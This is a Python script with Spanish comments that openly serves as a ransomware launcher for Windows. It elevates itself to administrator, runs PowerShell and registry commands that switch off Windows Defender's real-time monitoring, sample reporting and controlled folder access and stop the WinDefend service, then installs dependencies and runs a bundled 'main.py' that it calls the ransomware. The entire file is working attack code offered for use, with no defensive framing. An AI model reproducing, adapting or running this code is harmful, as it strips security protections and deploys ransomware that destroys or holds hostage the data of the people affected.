import ctypes
import subprocess
import os
import sys

# Define el directorio base donde están los archivos empaquetados
base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))

def is_admin():
    """ Verifica si el script se está ejecutando con privilegios de administrador. """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """ Relanza el script como administrador si no tiene los permisos necesarios. """
    if not is_admin():
        print("Reiniciando el script con privilegios de administrador...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def disable_windows_defender():
    """Desactiva características clave de Windows Defender usando PowerShell."""
    cmds = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Set-MpPreference -MAPSReporting Disabled",
        "Set-MpPreference -SubmitSamplesConsent NeverSend",
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v Start /t REG_DWORD /d 4 /f",
        "Set-MpPreference -EnableControlledFolderAccess Disabled"
    ]
    
    for cmd in cmds:
        try:
            result = subprocess.run(["powershell", "-Command", cmd], check=True, capture_output=True)
            print(f"Ejecutado: {cmd}")
        except subprocess.CalledProcessError as e:
            error_message = e.stderr.decode(errors="ignore").strip()
            print(f"Error al ejecutar {cmd}: {error_message}")
    
    # Intentar detener el servicio de Windows Defender de manera separada, ya que podría estar restringido
    try:
        print("Intentando detener el servicio de Windows Defender...")
        result = subprocess.run(["powershell", "-Command", "Stop-Service -Name WinDefend -Force"], check=True, capture_output=True)
        print("Servicio de Windows Defender detenido.")
    except subprocess.CalledProcessError as e:
        error_message = e.stderr.decode(errors="ignore").strip()
        print("No se pudo detener el servicio de Windows Defender. Puede estar restringido por la configuración del sistema.")
        print(f"Error detallado: {error_message}")

def install_dependencies():
    """ Instala las dependencias necesarias para el ejecutable principal """
    requirements_path = os.path.join(base_path, "requirements.txt")
    result = subprocess.run(["pip", "install", "-r", requirements_path], check=True, capture_output=True)
    if result.returncode != 0:
        raise RuntimeError("La instalación de dependencias falló.")
    return result.returncode

def execute_ransomware():
    """ Ejecuta el ejecutable del ransomware directamente en su ubicación actual """
    executable_path = os.path.join(base_path, "main.py")
    result = subprocess.run(["python", executable_path], check=True, capture_output=True)
    if result.returncode != 0:
        raise RuntimeError("La ejecución del ransomware falló.")
    return result.returncode

if __name__ == "__main__":
    run_as_admin()
    
    try:
        print("Desactivando Windows Defender...")
        disable_windows_defender()
        
        print("Instalando dependencias...")
        install_dependencies()
        
        print("Ejecutando el ransomware...")
        execute_ransomware()
        
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except RuntimeError as e:
        print(f"Error: {e}")
    except PermissionError as e:
        print("Error de permisos: asegúrate de ejecutar el script como administrador.")
